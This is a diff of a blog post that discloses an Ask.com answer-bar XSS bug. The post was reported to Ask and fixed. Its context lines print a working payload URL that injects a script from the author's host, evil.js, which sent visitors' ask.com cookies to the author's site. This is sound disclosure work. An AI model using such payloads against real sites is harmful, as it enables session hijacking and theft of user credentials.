@@ -21,7 +21,7 @@ For a demonstration, I asked some coworkers to make sure they were logged in to 
 
 `http://www.ask.com/bar?q=ask&page;=1&qsrc;=0&zoom;=&ab;=0&u;=javascript:document.write(%22%3Cscript%20src= \%22http://geoff.greer.fm/evil/evil.js?cachebuster=Math.random()\%22%3E%3C/script%3E%22);`
 
-...which downloaded and ran [evil.js](/evil/evil.js). Evil.js sent ask.com cookies to my site, then added an item to the user's [MyStuff](http://mystuff.ask.com/) saved results. The MyStuff item linked to [everyone's cookie info](/evil/suckers.php).
+...which downloaded and ran [evil.js](/evil/evil.js). Evil.js sent ask.com cookies to my site, then added an item to the user's [MyStuff](http://mystuff.ask.com/) saved results. The MyStuff item linked to [everyone's cookie info](/evil/suckers.html).
 
 It's a good thing Ask doesn't have any useful features, otherwise this vulnerability would be newsworthy. Instead it's just XSS practice for me and another security mistake by Ask. Ask deployed the answer bar on February 5th. E-mails were sent, tickets were filed, and it was fixed today, March 4th. Of course, that one bug is the [tip of the iceberg](http://www.xssed.com/search?key=ask.com). Thanks to [Paul](http://journal.paul.querna.org/) for pointing me to that site.
 
